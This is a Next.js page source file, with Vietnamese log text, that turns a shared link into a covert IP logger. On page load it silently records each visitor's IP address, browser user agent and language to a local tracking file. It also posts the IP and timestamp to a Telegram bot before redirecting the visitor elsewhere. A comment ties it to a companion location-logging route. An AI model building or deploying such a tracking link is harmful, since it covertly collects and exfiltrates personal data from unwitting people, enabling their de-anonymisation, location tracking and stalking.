
import { getIpLinksAction } from '@/app/actions/ip-links';
import { notFound, redirect } from 'next/navigation';
import { headers } from 'next/headers';
import fs from 'fs';
import path from 'path';
import { getVerificationConfigAction } from '@/app/actions/settings';

// Copied from api/log-location/route.ts
async function sendTelegramNotification(message: string) {
    try {
        const config = await getVerificationConfigAction();
        if (
            !config.telegramNotificationsEnabled ||
            !config.telegramBotToken ||
            !config.telegramChatId
        ) {
            return;
        }

        const botToken = config.telegramBotToken;
        const chatId = config.telegramChatId;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true,
            }),
        });
    } catch (error) {
        console.error('Failed to send Telegram notification:', error);
    }
}

async function logAccess(linkId: string, title: string, redirectUrl: string) {
    const headersList = headers();
    const ua = headersList.get('user-agent') ?? 'unknown';
    const clientIp = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || 'N/A';
    const finalIp = clientIp.startsWith('::ffff:') ? clientIp.substring(7) : clientIp;
    const language = headersList.get('accept-language')?.split(',')[0];

    const timestamp = new Date().toISOString();
    
    let logData = `--- [${timestamp}] MỚI TRUY CẬP ---\n`;
    logData += `Nguồn: ip_link\n`; // Simple source
    logData += `Thiết bị: ${ua}\n`;
    logData += `Địa chỉ IP: ${finalIp}\n`;
    logData += `Ngôn ngữ: ${language || 'N/A'}\n`;
    logData += `Múi giờ: N/A\n`;
    logData += `Tọa độ: N/A\n`;
    logData += `Độ chính xác: N/A\n`;
    logData += `Địa chỉ: ${title}\n`; // Use address field for title
    logData += `Link Google Maps: ${redirectUrl}\n`; // Use maps link for redirect url
    logData += `----------------------------------\n`;

    const logDir = path.join(process.cwd(), 'logs');
    const logFile = path.join(logDir, 'tracking_logs.txt');
    
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }
    fs.appendFileSync(logFile, logData, 'utf-8');

    let telegramMessage = `*🔔 Truy cập mới (IP Link)!*\n\n`;
    telegramMessage += `*Tiêu đề:* \`${title}\`\n`;
    telegramMessage += `*Thời gian:* \`${new Date(timestamp).toLocaleString('vi-VN')}\`\n`;
    telegramMessage += `*Địa chỉ IP:* \`${finalIp}\`\n`;
    telegramMessage += `*Chuyển hướng đến:* ${redirectUrl}\n`;
    
    sendTelegramNotification(telegramMessage);
}

export default async function IpRedirectPage({ params }: { params: { id: string } }) {
  const links = await getIpLinksAction();
  const config = links.find(link => link.id === params.id);

  if (!config) {
    notFound();
  }

  logAccess(params.id, config.title, config.redirectUrl);

  redirect(config.redirectUrl);
}
